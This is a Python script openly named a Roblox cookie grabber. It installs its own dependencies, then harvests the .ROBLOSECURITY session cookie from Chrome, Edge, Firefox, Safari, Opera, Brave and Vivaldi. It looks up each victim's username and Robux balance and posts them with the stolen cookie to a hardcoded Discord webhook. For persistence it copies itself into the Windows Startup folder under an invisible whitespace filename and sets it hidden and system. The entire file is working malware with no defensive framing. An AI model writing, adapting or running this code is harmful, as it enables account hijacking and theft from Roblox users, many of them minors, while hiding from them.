import os
import random
import shutil
import sys
import subprocess
import pkg_resources

# Function to check and install required packages
def install_requirements():
    required = {'browser_cookie3', 'requests'}
    installed = {pkg.key for pkg in pkg_resources.working_set}
    missing = required - installed
    if missing:
        for package in missing:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])

# Install required packages if not already installed
install_requirements()

import browser_cookie3
import requests

class RobloxCookieGrabber:
    def __init__(self):
        self.roblox_cookies = {}
        self.grab_roblox_cookies()
        self.send_info()
        self.persist()

    def grab_roblox_cookies(self):
        browsers = [
            ('Chrome', browser_cookie3.chrome),
            ('Edge', browser_cookie3.edge),
            ('Firefox', browser_cookie3.firefox),
            ('Safari', browser_cookie3.safari),
            ('Opera', browser_cookie3.opera),
            ('Brave', browser_cookie3.brave),
            ('Vivaldi', browser_cookie3.vivaldi)
        ]
        for browser_name, browser in browsers:
            try:
                browser_cookies = browser(domain_name='roblox.com')
                for cookie in browser_cookies:
                    if cookie.name == '.ROBLOSECURITY':
                        self.roblox_cookies[browser_name] = cookie.value
            except Exception:
                pass

    def send_info(self):
        webhook_url = 'https://discord.com/api/webhooks/1320478091159535668/xlCtN6vnpbOZckV9_fpYPLAUhasRND4s87xUgkDOevdaBwYKlD8h2HiuxjxUs6WghRdE'
        for roblox_cookie in self.roblox_cookies.values():
            headers = {"Cookie": ".ROBLOSECURITY=" + roblox_cookie}
            info = None
            try:
                response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
                response.raise_for_status()
                info = response.json()
            except Exception:
                pass

            if info is not None:
                data = {
                    "embeds": [
                        {
                            "title": "Roblox Info",
                            "color": 5639644,
                            "fields": [
                                {"name": "Name:", "value": f"`{info['UserName']}`", "inline": True},
                                {"name": "Robux:", "value": f"`{info['RobuxBalance']}`", "inline": True},
                                {"name": "Cookie:", "value": f"`{roblox_cookie}`", "inline": False},
                            ],
                            "thumbnail": {"url": info['ThumbnailUrl']},
                            "footer": {"text": "Roblox Cookie Grabber"}
                        }
                    ],
                    "username": "RobloxGrabber",
                    "avatar_url": "https://example.com/avatar.png"
                }
                requests.post(webhook_url, json=data)

    def persist(self):
        startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        while True:
            target_path = os.path.join(startup_path, "{}.scr".format("".join(random.choices(["\xa0", chr(8239)] + [chr(x) for x in range(8192, 8208)], k=5))))
            if not os.path.exists(target_path):
                break
        self.copy_to_startup(target_path)

    def get_self(self):
        if hasattr(sys, "frozen"):
            return sys.argv[0]
        else:
            return __file__

    def copy_to_startup(self, target_path):
        source_path = os.path.abspath(self.get_self())
        if os.path.basename(os.path.dirname(source_path)).lower() == "startup":
            return
        shutil.copy(source_path, target_path)
        os.system(f'attrib +h +s "{target_path}"')

if __name__ == '__main__':
    RobloxCookieGrabber()
